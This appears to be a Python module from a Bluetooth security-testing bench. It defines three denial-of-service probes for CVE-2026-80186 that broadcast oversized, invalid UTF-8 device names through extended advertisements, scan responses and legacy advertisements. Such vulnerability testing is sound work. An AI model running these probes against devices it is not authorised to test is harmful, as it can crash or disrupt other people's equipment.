# cve-2026-80186 extended-advertising name overflow

from __future__ import annotations

import asyncio

from .. import protocol
from ..bench import Context, Level, ProbeResult, Status, probe


async def _send_and_watch(context: Context, payload: bytes, label: str, scan_response: bytes = b"") -> ProbeResult:
    await context.transport.advertise(payload, scan_response=scan_response, extended=True)
    try:
        await asyncio.sleep(1.0)
        await context.connect()
        await asyncio.sleep(4.0)
    finally:
        await context.disconnect()
        await context.transport.stop_advertising()
    return ProbeResult(
        "eir_overflow",
        Status.FINDING,
        f"{label}: {len(payload)}-byte advertising payload sent",
        "high",
        {"payload": payload.hex(), "length": len(payload), "variant": label},
    )


@probe(
    "eir_overflow",
    "CVE-2026-80186 extended-advertising name overflow",
    Level.DOS,
    timeout=45,
    cve="CVE-2026-80186",
    description="255-byte extended advertisement, 254-byte invalid UTF-8 complete name",
)
async def eir_overflow(context: Context) -> ProbeResult:
    payload = protocol.eir_overflow_extended_advertisement(254)
    return await _send_and_watch(context, payload, "extended-advertising")


@probe(
    "eir_overflow_scan_response",
    "CVE-2026-80186 via scan response",
    Level.DOS,
    timeout=45,
    cve="CVE-2026-80186",
    description="254-byte invalid UTF-8 name in a scan response",
)
async def eir_overflow_scan_response(context: Context) -> ProbeResult:
    payload = protocol.ad_flags() + protocol.ad_service_uuid16(0x1F1F)
    scan_response = protocol.ad_name(protocol.eir_overflow_name(254))
    result = await _send_and_watch(context, payload, "scan-response", scan_response=scan_response)
    result.probe = "eir_overflow_scan_response"
    return result


@probe(
    "eir_overflow_legacy",
    "CVE-2026-80186 with a legacy 31-byte advertisement",
    Level.DOS,
    timeout=45,
    cve="CVE-2026-80186",
    description="31-byte legacy advertising and 254-byte scan response",
)
async def eir_overflow_legacy(context: Context) -> ProbeResult:
    payload = protocol.ad_flags() + protocol.ad_service_uuid16(0x1F1F)
    scan_response = protocol.ad_name(protocol.eir_overflow_name(254))
    await context.transport.advertise(payload, scan_response=scan_response, extended=False)
    try:
        await asyncio.sleep(1.0)
        await context.connect()
        await asyncio.sleep(4.0)
    finally:
        await context.disconnect()
        await context.transport.stop_advertising()
    return ProbeResult(
        "eir_overflow_legacy",
        Status.FINDING,
        "legacy advertisement with 254-byte invalid UTF-8 scan response sent",
        "high",
        {"scan_response": scan_response.hex(), "length": len(scan_response)},
    )
